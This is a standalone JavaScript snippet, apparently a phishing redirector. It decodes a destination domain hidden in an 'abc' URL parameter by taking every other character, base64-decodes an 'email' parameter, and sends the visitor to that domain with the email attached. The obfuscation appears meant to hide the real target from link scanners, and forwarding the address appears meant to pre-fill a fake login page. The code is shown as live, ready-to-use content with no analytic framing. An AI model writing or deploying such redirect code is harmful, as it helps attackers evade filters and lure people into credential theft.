<script>

// Get the current URL
var currentUrl = window.location.href;

// Function to decode base64 encoded string
function decodeBase64(encodedString) {
    return atob(encodedString);
}

// Function to clean the abc value (remove every other character)
function decodeAbcPattern(str) {
    let result = '';
    for (let i = 1; i < str.length; i += 2) {
        result += str[i];
    }
    return result;
}

// Extract abc= from URL
var abcMatch = currentUrl.match(/[?&#]abc=([^&]*)/);
var baseUrl = 'https://goal.com'; // default fallback
if (abcMatch) {
    var encodedDomain = abcMatch[1];
    var decodedDomain = decodeAbcPattern(encodedDomain);

    // Prepend https:// if not already included
    if (!decodedDomain.startsWith('http://') && !decodedDomain.startsWith('https://')) {
        decodedDomain = 'https://' + decodedDomain;
    }

    baseUrl = decodedDomain;
}

// Extract email= from URL (any position)
var emailMatch = currentUrl.match(/[?&#]email=([^&]*)/) || currentUrl.match(/#email=([^&]*)/);
if (emailMatch) {
    var encodedEmail = emailMatch[1];
    var decodedEmail = encodedEmail;
    try {
        decodedEmail = decodeBase64(encodedEmail);
    } catch (e) {
        // Invalid base64, fallback to raw value
    }

    var redirectUrl = baseUrl + '#' + decodedEmail;
    window.location.href = redirectUrl;
} else {
    console.log('Email address not found');
}


</script>
